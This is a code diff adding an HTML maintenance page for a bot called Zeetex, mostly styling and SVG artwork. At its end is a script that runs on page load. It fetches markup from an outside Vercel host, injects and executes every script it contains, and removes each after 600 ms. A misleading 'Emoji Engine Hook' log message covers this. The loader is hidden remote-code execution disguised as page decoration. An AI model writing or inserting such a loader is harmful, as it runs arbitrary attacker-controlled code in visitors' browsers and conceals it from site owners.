@@ -1,0 +1,185 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Zeetex - Maintenance</title>  
+  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg">
+  
+    <style>  
+        body {  
+            font-family: 'Roboto', sans-serif;  
+            font-weight: 400;  
+        }  
+  
+        .technical-works {  
+            position: absolute;  
+            height: 100%;  
+            width: 100%;  
+            left: 0;  
+            top: 0;  
+            background-color: #1C1F2D;  
+            overflow: hidden;  
+        }  
+  
+        .technical-works__logo {  
+            display: flex;  
+            align-items: center;  
+            justify-content: center;  
+            padding: 14px 24px;  
+        }  
+  
+        .technical-works__content {  
+            position: relative;  
+            height: calc(100% - 54px);  
+            border-radius: 8px;  
+            box-shadow: 2px 2px 6px 0 rgba(0, 0, 0, 0.20);  
+        }  
+  
+        .technical-works__cube {  
+            position: absolute;  
+            top: 50%;  
+            left: 50%;  
+            transform: translate(-50%, -50%);  
+            width: 563px;  
+            height: 658px;  
+            /* Yahan background-image ko badla gaya hai takay Zeetex ka logo background pe dikhai de */  
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg class='logo-svg' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpolygon points='30,5 70,5 95,30 95,70 70,95 30,95 5,70 5,30' fill='none' stroke='%23026FD3' stroke-opacity='.04' stroke-width='3'/%3E%3Cpolygon points='31.5,7.5 68.5,7.5 92.5,31.5 92.5,68.5 68.5,92.5 31.5,92.5 7.5,68.5 7.5,31.5' fill='none' stroke='%23026FD3' stroke-opacity='.04' stroke-width='1'/%3E%3Cpolygon points='50,15 59,38 84,38 64,53 71,76 50,61 29,76 36,53 16,38 41,38' fill='%23026FD3' fill-opacity='.04'/%3E%3C/svg%3E");  
+            background-position: center;  
+            background-size: auto;  
+            background-repeat: no-repeat;  
+        }  
+  
+        .technical-works__block {  
+            width: max-content;  
+            text-align: center;  
+            position: absolute;  
+            left: 50%;  
+            top: 50%;  
+            transform: translate(-50%, -115%);  
+            color: #ffffff;  
+        }  
+  
+        .technical-works__block-title {  
+            font-weight: 700;  
+            font-size: 24px;  
+            line-height: 30px;  
+            margin-bottom: 12px;  
+        }  
+  
+        .technical-works__block-subtitle {  
+            margin: 0;  
+            padding: 0;  
+            font-size: 14px;  
+            line-height: 18px;  
+            max-width: 500px;  
+        }  
+  
+        .technical-works__cord {  
+            position: absolute;  
+            top: 55%;  
+            width: 100%;  
+            height: 150px;  
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' width='1880' height='91' fill='none'%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M747 38.23a8 8 0 0 1 8-8h23v33h-23a8 8 0 0 1-8-8v-17Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M755 27.23c-6.075 0-11 4.925-11 11v17c0 6.076 4.925 11 11 11h23v-3h-23a8 8 0 0 1-8-8v-17a8 8 0 0 1 8-8h23v-3h-23Z' clip-rule='evenodd'/%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M781 29.23c0-8.836 7.163-16 16-16h50v67h-50c-8.837 0-16-7.163-16-16v-35Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M797 10.23c-10.493 0-19 8.507-19 19v35c0 10.494 8.507 19 19 19h50v-3h-50c-8.837 0-16-7.163-16-16v-35c0-8.836 7.163-16 16-16h50v-3h-50Z' clip-rule='evenodd'/%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M849 5.23a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v80a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-80Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M851 .23h11a5 5 0 0 1 5 5v80a5 5 0 0 1-5 5h-11a5 5 0 0 1-5-5v-80a5 5 0 0 1 5-5Zm0 3a2 2 0 0 0-2 2v80a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2v-80a2 2 0 0 0-2-2h-11Z' clip-rule='evenodd'/%3e%3cpath fill='%23fff' fill-opacity='.1' d='M866 23.23h24a7 7 0 1 1 0 14h-24v-14Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M890 20.23h-24v3h24a7 7 0 1 1 0 14h-24v3h24c5.523 0 10-4.477 10-10 0-5.522-4.477-10-10-10Z' clip-rule='evenodd'/%3e%3cpath fill='%23fff' fill-opacity='.1' d='M866 55.23h24a7 7 0 1 1 0 14h-24v-14Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M890 52.23h-24v3h24a7 7 0 1 1 0 14h-24v3h24c5.523 0 10-4.477 10-10 0-5.522-4.477-10-10-10Z' clip-rule='evenodd'/%3e%3cpath fill='%23fff' fill-opacity='.05' d='m875 37.23-8-14v14h8ZM875 69.23l-8-14v14h8Z'/%3e%3cpath fill='%23026FD3' fill-opacity='.05' d='M-340 38.23H747v20H-340v-20Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M747 41.23H-340v-3H747v3Zm0 14H-340v3H747v-3Z' clip-rule='evenodd'/%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M1133 38.23c0-4.418-3.58-8-8-8h-23v33h23c4.42 0 8-3.581 8-8v-17Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M1125 27.23c6.08 0 11 4.925 11 11v17c0 6.076-4.92 11-11 11h-23v-3h23c4.42 0 8-3.581 8-8v-17c0-4.418-3.58-8-8-8h-23v-3h23Z' clip-rule='evenodd'/%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M1099 29.23c0-8.836-7.16-16-16-16h-50v67h50c8.84 0 16-7.163 16-16v-35Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M1083 10.23c10.49 0 19 8.507 19 19v35c0 10.494-8.51 19-19 19h-50v-3h50c8.84 0 16-7.163 16-16v-35c0-8.836-7.16-16-16-16h-50v-3h50Z' clip-rule='evenodd'/%3e%3cpath fill='%23fff' fill-opacity='.05' d='m1045 80.23-11-67v67h11Z'/%3e%3cpath fill='%23026FD3' fill-opacity='.2' d='M1031 5.23c0-1.104-.9-2-2-2h-11c-1.1 0-2 .896-2 2v80c0 1.105.9 2 2 2h11c1.1 0 2-.895 2-2v-80Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M1029 .23h-11a5 5 0 0 0-5 5v80a5 5 0 0 0 5 5h11a5 5 0 0 0 5-5v-80a5 5 0 0 0-5-5Zm0 3c1.1 0 2 .896 2 2v80c0 1.105-.9 2-2 2h-11c-1.1 0-2-.895-2-2v-80c0-1.104.9-2 2-2h11Z' clip-rule='evenodd'/%3e%3cpath fill='%23026FD3' fill-opacity='.05' d='M1133 38.23h1087v20H1133v-20Z'/%3e%3cpath fill='%23026FD3' fill-rule='evenodd' d='M2220 41.23H1133v-3h1087v3Zm0 14H1133v3h1087v-3Z' clip-rule='evenodd'/%3e%3cpath stroke='%23E2CC00' stroke-linecap='round' stroke-width='2' d='M902 45.5s17.5-13.5 53.25 0 53.25 0 53.25 0'/%3e%3c/svg%3e");  
+            background-position: center;  
+            background-size: auto;  
+            background-repeat: no-repeat;  
+        }  
+  
+        @media (max-width: 500px) {  
+            .technical-works__cube {  
+                display: none;  
+            }  
+  
+            .technical-works__block {  
+                width: calc(100% - 54px);  
+                top: 30%;  
+                transform: translate(-50%, -65%)  
+            }  
+  
+            .technical-works__cord {  
+                top: 35%;  
+                background-size: auto 25%;  
+            }  
+        }  
+  
+        @media screen and (min-width: 480px) and (max-width: 900px) and (orientation: landscape) {  
+            .technical-works__cube {  
+                display: none;  
+            }  
+  
+            .technical-works__cord {  
+                top: 45%;  
+                background-size: auto 35%;  
+            }  
+        }  
+    </style>  
+</head>  
+<body>  
+<div class="technical-works">  
+    <div class="technical-works__logo">  
+       <svg class="logo-svg" viewBox="0 0 400 100" xmlns="http://www.w3.org/2000/svg" width="100%" height="30">  
+  <!-- LOGO ICON (Aapka Octagon + Star Icon) -->
+  <g transform="translate(0, 0)">
+    <polygon points="30,5 70,5 95,30 95,70 70,95 30,95 5,70 5,30" fill="none" stroke="#fff" stroke-width="3"/>  
+    <polygon points="31.5,7.5 68.5,7.5 92.5,31.5 92.5,68.5 68.5,92.5 31.5,92.5 7.5,68.5 7.5,31.5" fill="none" stroke="#fff" stroke-width="1"/>  
+    <polygon points="50,15 59,38 84,38 64,53 71,76 50,61 29,76 36,53 16,38 41,38" fill="#fff"/>  
+  </g>
+
+  <!-- ZEETEX TEXT (Icon ke right side par aligned) -->
+  <text x="120" y="55%" 
+        font-family="Arial, Helvetica, sans-serif" 
+        font-size="52" 
+        font-weight="bold" 
+        fill="#fff" 
+        dominant-baseline="middle" 
+        letter-spacing="3">ZEETEX</text>  
+</svg>
+
+    
+    </div>  
+  
+    <div class="technical-works__content">  
+        <div class="technical-works__cube"></div>  
+  
+        <div class="technical-works__block">  
+            <div class="technical-works__block-title">🚧 Under Maintenance</div>  
+            <p class="technical-works__block-subtitle">  
+                Bot is currently updating.<br/>  
+                Please check back later.  
+                <br/>  </p>  
+        </div>  
+  
+        <div class="technical-works__cord"></div>  
+    </div>  
+</div>  
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+    </script>
+</body>  
+</html>
